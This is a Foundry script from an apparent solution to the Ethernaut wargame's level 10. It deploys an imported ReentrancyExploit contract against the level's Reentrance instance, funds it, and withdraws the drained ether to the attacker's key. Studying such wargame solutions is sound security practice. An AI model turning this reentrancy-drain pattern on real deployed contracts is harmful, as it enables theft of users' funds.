// SPDX-License-Identifier: CC-BY-4.0
// Mia Stein solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Reentrance} from "src/10/Reentrancy.sol";
import {ReentrancyExploit} from "src/10/ReentrancyExploit.sol";

contract Exploit is Script {

        address payable instance = payable(vm.envAddress("INSTANCE_LEVEL10"));  
        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));    
        Reentrance level = Reentrance(instance); 
        ReentrancyExploit exploit;
        uint256 immutable initialDeposit = 0.001 ether;
          
        function run() external {

            vm.startBroadcast(hacker);
            
            exploit = new ReentrancyExploit(level);
            exploit.run{value: initialDeposit}();
            bool success = exploit.withdrawToHacker();
            assert(success);

            vm.stopBroadcast();
    }
}